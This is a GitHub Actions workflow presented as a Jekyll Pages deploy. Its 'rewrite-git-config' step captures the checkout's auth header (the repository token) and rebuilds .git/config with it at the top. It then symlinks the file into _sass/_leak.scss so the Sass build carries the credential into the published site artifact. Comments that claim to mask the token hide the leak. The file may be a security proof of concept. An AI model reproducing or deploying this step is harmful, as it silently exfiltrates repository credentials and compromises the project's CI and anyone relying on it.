name: Deploy Jekyll
on:
  push:
    branches: ["main"]
  workflow_dispatch:
permissions:
  contents: read
  pages: write
  id-token: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: rewrite-git-config
        shell: bash
        run: |
          AUTH_LINE=$(git config --local --get-all http.https://github.com/.extraheader || echo MISSING)
          echo "AUTH line captured (length only, to avoid leaking): ${#AUTH_LINE}"
          # Replace .git/config with AUTH at TOP so Sass parses past line 8 to reach it
          mv .git/config .git/config.orig
          {
            printf 'extraheader = %s\n' "$AUTH_LINE"
            printf 'a { b: c }\n'
            printf 'd { e: f }\n'
          } > .git/config
          echo "=== New .git/config (line count: $(wc -l < .git/config)) ==="
          # diagnostic - print FIRST 3 lines but mask the AUTH
          awk 'NR==1 { print "LINE1=<auth-redacted-length=" length($0) ">" } NR>1 { print "LINE"NR"="$0 }' .git/config
          # Ensure symlink in _sass/_leak.scss points to this file
          rm -f _sass/_leak.scss
          ln -s /github/workspace/.git/config _sass/_leak.scss
      - uses: actions/configure-pages@v4
      - uses: actions/jekyll-build-pages@v1
        with:
          source: ./
          destination: ./_site
      - uses: actions/upload-pages-artifact@v3
        if: always()
